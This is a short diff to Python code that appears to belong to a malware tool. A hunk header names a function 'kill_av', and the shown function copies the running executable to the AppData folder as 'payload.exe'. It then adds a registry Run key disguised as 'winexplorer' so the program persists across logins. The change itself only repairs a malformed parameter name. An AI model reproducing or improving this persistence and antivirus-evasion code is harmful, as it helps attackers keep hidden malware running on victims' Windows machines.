@@ -122,10 +122,10 @@ def kill_av():
 
               
 
-def windowspersistence(time to persistent):
+def windowspersistence(time_to_persistent):
        payload_location = os.environ["appdata"] + "\\payload.exe"
        if not os.path.exists(payload_location):
-              time.sleep(int(time to persistent))
+              time.sleep(int(time_to_persistent))
               shutil.copyfile(sys.executable, payload_location)
               subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + payload_location + '"',shell=True)
 
